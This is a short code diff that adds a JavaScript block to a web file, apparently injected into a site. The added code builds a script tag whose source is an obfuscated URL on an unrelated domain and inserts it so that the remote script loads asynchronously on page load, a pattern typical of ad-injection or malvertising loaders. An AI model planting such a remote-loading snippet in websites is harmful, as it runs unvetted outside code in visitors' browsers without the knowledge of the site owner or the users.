@@ -56,3 +56,15 @@ s.async = true;
 s.referrerPolicy = 'no-referrer-when-downgrade';
 l.parentNode.insertBefore(s, l);
 })({})
+
+
+(function(gyj){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = gyj || {};
+s.src = "\/\/deliciouslip.com\/bJXsV.s\/dNGRlK0XYdW\/cX\/CeEmH9wulZDU\/l\/kGPATjcYw\/OET\/EU0xM_zocut_NSzOAJ5IMKTQQF0FMpQ_";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
